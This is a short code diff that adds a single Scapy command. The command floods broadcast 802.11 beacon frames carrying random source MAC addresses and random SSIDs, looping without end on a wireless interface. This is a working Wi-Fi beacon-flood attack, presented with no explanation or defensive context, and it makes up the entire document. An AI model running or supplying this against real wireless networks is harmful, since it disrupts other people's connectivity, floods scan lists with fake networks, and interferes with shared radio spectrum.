@@ -1,0 +1,6 @@
+sendp(Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/  
+          Dot11Beacon(cap="ESS")/  
+          Dot11Elt(ID="SSID",info=RandString(RandNum(1,50)))/  
+          Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/  
+          Dot11Elt(ID="DSset",info="\x03")/  
+          Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"),iface="wifi360",loop=1)  
